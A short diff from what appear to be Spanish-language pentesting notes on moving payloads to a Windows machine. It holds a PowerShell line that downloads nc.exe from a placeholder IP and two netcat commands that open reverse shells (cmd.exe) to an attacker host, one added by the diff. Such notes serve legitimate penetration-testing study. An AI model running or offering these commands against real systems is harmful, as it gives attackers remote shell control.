@@ -33,6 +33,7 @@ C:\Windows\Temp
 	# payload.exe = Nombre del archivo a descargar en la maquina Windows 
 
 3 ❯ powershell -c "Invoke-WebRequest http://IP/nc.exe -OutFile nc.exe"   # Descargar el payload de la maquina Linux
+	❯ nc.exe IP_Kali 443 -e cmd.exe   # Obtener la reverse shell 
 
 4 ❯ \\\\IP\smbFolder\nc.exe -e cmd IP 443      # Ejecutar una revershell con el binario 'Netcat'
 
